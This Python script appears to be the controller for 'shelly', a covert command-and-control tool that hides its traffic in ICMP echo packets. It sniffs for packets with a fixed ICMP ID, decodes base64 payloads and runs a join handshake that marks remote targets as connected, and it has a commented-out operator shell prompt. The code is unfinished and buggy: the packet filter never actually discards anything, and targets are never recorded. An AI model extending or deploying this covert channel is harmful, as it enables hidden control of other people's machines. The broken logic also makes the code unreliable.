#!/usr/bin/python3

from scapy.all import sr,IP,ICMP,Raw,sniff
import os
import socket
import psutil
import pwd
import base64
from multiprocessing import Process, Manager
from multiprocessing.managers import BaseManager
import json
import ast
from shelly import Host, Target
import shelly

TTL = int(64)
ICMP_ID = int(12800)

class CustomManager(BaseManager):
    pass

class Controller(Host):
    
    def __init__(self):
        super().__init__()
        self.targets = []

    def sniff_callback(self, packet):
        # Parses out things that shouldn't be there
        if packet[ICMP].type != 8:
            pass
        elif packet[ICMP].id != ICMP_ID:
            pass
        elif not packet[Raw].load:
            pass

        encoded_shellpack = (packet[Raw].load).decode('utf-8', errors='ignore')
        shellpack = base64.b64decode(encoded_shellpack).decode()
        unpacked = ast.literal_eval(shellpack)
        
        match unpacked['command']:
            case "join":
                self.join(unpacked)
            case _:
                print("Default case")

    def join(self, shellpack):
        
        match shellpack['message']:
            case "hello":
                target = Target(shellpack)
                target.status = "SHAKING"
                response_shellpack = shelly.build_shellpack(self, "join", "how are you")
                shelly.send(target.ip, "join", "how are you")
            case "fine thank you":
                for target in self.targets:
                    if target.ip == shellpack['ip']:
                        target.status = "CONNECTED"

        return

def sniffing(controller):
     sniff(iface=controller.iface, filter="icmp", prn=controller.sniff_callback, store="0")

def setup_controller() -> Controller:
    print("[ Setting up controller... ]")
    controller = Controller()
    print(controller)

    return controller

if __name__ == "__main__":
    #BaseManager.register('Controller', Controller)
    #manager = BaseManager()
    #manager.start(#)
    #controller = manager.Controller()

    #print(controller)
    
    CustomManager.register('Controller', Controller)
    with CustomManager() as manager:
        # create a shared set instance
        controller = manager.Controller()
        # start some child processes
        sniff_proc = Process(target=sniffing, args=(controller,))
        #for process in processes:
        sniff_proc.start()
    #sniffing = Process(target=sniffing, args=(controller,))
    #sniffing.start()
    
    #print("Starting listener")
    #while True:
    #    cmd = input("shelly > ")
    #    if cmd == "ls":
    #        print(controller.targets[0])
